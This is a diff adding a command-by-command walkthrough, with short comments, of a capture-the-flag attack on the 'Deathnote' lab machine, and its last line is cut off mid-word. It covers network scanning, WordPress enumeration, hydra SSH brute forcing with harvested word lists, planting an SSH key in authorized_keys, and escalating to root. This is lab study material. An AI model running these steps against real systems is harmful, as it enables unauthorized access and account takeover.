@@ -1,1 +1,45 @@
-
+ifconfig \\Displays network interface details such as IP address and subnet information of the attacker machine.
+sudo -i \\Switches to root (administrator) user to execute privileged commands.
+nmap -sP 192.168.200.1/24 \\Performs a ping sweep to discover active hosts in the given subnet
+nmap -sV -sC -O -p- 192.168.200.2 \\Performs a full TCP port scan:
+                                    -sV → Detects service versions
+                                    -sC → Runs default scripts
+                                    -O → Detects operating system
+                                    -p- → Scans all ports
+wpscan --url http://deathnote.vuln/wordpress  \\Scans the WordPress site for vulnerabilities, plugins, themes, and exposed information
+gobuster dir -u http://deathnote.vuln/ -w /usr/share/wordlists/dirb/common.txt  \\Searches for hidden directories in the main website.
+http://192.168.200.4/robots.txt  \\Accesses the robots.txt file to find hidden or restricted directories
+wget http://192.168.200.4/important.jpg \\Downloads a file from the target server.
+ls \\Lists files and directories in the current folder
+wget http://deathnote.vuln/wordpress/wpcontent/uploads/2021/07/user.txt \\Downloads a file containing possible usernames
+wget http://deathnote.vuln/wordpress/wpcontent/uploads/2021/07/notes.txt \\Downloads a file containing possible passwords
+hydra -L user.txt -P notes.txt ssh://192.168.200.4 \\Performs SSH brute-force attack:
+                                                        -L → Username list
+                                                        -P → Password list
+ssh l@192.168.200.4 \\Logs into the target machine using SSH with username "l".
+cat user.txt \\Displays contents of the file
+id  \\Displays current user ID and group privileges.
+sudo -l  \\Lists commands the current user can run with sudo privileges
+cd /home \\Moves to the home directory.
+cd kira \\Navigates into the "kira" user directory.
+ls -al \\Lists all files including hidden ones with detailed permissions
+cat kira.txt \\Displays contents of kira.txt (possibly encoded data).
+cd .ssh  \\Navigates into the SSH configuration directory.
+cat authorized_keys \\Displays authorized SSH public keys.
+cd /home/ln  \\Switches to user "l" home directory.
+vi authorized_keys \\Edits the authorized_keys file to insert SSH key.
+:wq \\Saves and exits the vi editor.
+chmod +x authorized_keys \\Changes file permissions (makes file executable).
+ssh kira@192.168.200.4 \\Logs in as user "kira" via SSH.
+base64 -d kira.txt \\Decodes Base64 encoded file.
+cd /opt/ \\Moves to optional software directory.
+cd L \\Enters subdirectory "L".
+cd fake-notebook-rule/ \\Navigates into specific folder containing clues.
+cat hint \\Displays hint file content.
+file case.wav \\Identifies file type of case.wav.
+cat case.wav \\Displays raw content of the file (encoded data).
+sudo -l \\Checks sudo privileges again for privilege escalation.
+cd /root \\Attempts to access root directory.
+sudo su \\Switches to root user.
+ls \\Lists files in root directory.
+cat root.txt \\Displays root flag (proof of full system comprom
